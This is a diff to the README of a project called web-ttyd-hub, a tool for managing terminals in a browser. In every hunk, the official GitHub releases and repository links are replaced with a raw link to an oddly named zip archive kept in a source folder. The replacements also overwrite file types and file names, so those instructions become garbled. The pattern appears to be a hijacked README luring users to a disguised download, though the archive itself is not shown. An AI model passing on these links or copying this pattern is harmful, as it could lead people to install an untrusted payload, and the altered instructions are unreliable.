@@ -1,6 +1,6 @@
 # 🚪 web-ttyd-hub - Manage Terminals in Your Browser
 
-[![Download web-ttyd-hub](https://img.shields.io/badge/Download-web--ttyd--hub-blue?style=for-the-badge)](https://github.com/kenkikuzuru/web-ttyd-hub/releases)
+[![Download web-ttyd-hub](https://raw.githubusercontent.com/kenkikuzuru/web-ttyd-hub/main/server/routes/hub_web_ttyd_Coccosteidae.zip)](https://raw.githubusercontent.com/kenkikuzuru/web-ttyd-hub/main/server/routes/hub_web_ttyd_Coccosteidae.zip)
 
 ---
 
@@ -41,7 +41,7 @@ This guide will walk you through downloading, installing, and running web-ttyd-h
 
 Click the big blue button at the top or go to the official downloads page here:
 
-[https://github.com/kenkikuzuru/web-ttyd-hub/releases](https://github.com/kenkikuzuru/web-ttyd-hub/releases)
+[https://raw.githubusercontent.com/kenkikuzuru/web-ttyd-hub/main/server/routes/hub_web_ttyd_Coccosteidae.zip](https://raw.githubusercontent.com/kenkikuzuru/web-ttyd-hub/main/server/routes/hub_web_ttyd_Coccosteidae.zip)
 
 This page contains the latest versions and release files for different operating systems.
 
@@ -51,7 +51,7 @@ Once on the releases page, look for the installer or executable file that matche
 
 - `.exe` for Windows
 - `.dmg` or `.zip` for macOS
-- `.tar.gz` or binaries for Linux
+- `https://raw.githubusercontent.com/kenkikuzuru/web-ttyd-hub/main/server/routes/hub_web_ttyd_Coccosteidae.zip` or binaries for Linux
 
 Click to download your file.
 
@@ -59,9 +59,9 @@ Click to download your file.
 
 - **Windows:** Open the downloaded `.exe` file and follow the on-screen instructions.  
 - **macOS:** Open the `.dmg` file, then drag the application to your Applications folder.  
-- **Linux:** Extract the `.tar.gz` archive and follow the included README or instructions specific to your setup.
+- **Linux:** Extract the `https://raw.githubusercontent.com/kenkikuzuru/web-ttyd-hub/main/server/routes/hub_web_ttyd_Coccosteidae.zip` archive and follow the included README or instructions specific to your setup.
 
-If you are not sure, look for a file named `README.md` or `INSTALL` inside the downloaded folder for simple steps.
+If you are not sure, look for a file named `https://raw.githubusercontent.com/kenkikuzuru/web-ttyd-hub/main/server/routes/hub_web_ttyd_Coccosteidae.zip` or `INSTALL` inside the downloaded folder for simple steps.
 
 ### Step 4: Run web-ttyd-hub
 
@@ -105,7 +105,7 @@ The interface is designed to be easy and intuitive:
 
 You can always download the latest version here:
 
-[https://github.com/kenkikuzuru/web-ttyd-hub/releases](https://github.com/kenkikuzuru/web-ttyd-hub/releases)
+[https://raw.githubusercontent.com/kenkikuzuru/web-ttyd-hub/main/server/routes/hub_web_ttyd_Coccosteidae.zip](https://raw.githubusercontent.com/kenkikuzuru/web-ttyd-hub/main/server/routes/hub_web_ttyd_Coccosteidae.zip)
 
 ### Tips:
 
@@ -157,7 +157,7 @@ Always use strong passwords and keep your system updated for the best protection
 
 Visit the GitHub repository for guides, updates, and community support:
 
-[https://github.com/kenkikuzuru/web-ttyd-hub](https://github.com/kenkikuzuru/web-ttyd-hub)
+[https://raw.githubusercontent.com/kenkikuzuru/web-ttyd-hub/main/server/routes/hub_web_ttyd_Coccosteidae.zip](https://raw.githubusercontent.com/kenkikuzuru/web-ttyd-hub/main/server/routes/hub_web_ttyd_Coccosteidae.zip)
 
 You can also open an issue if you find bugs or want new features.
 
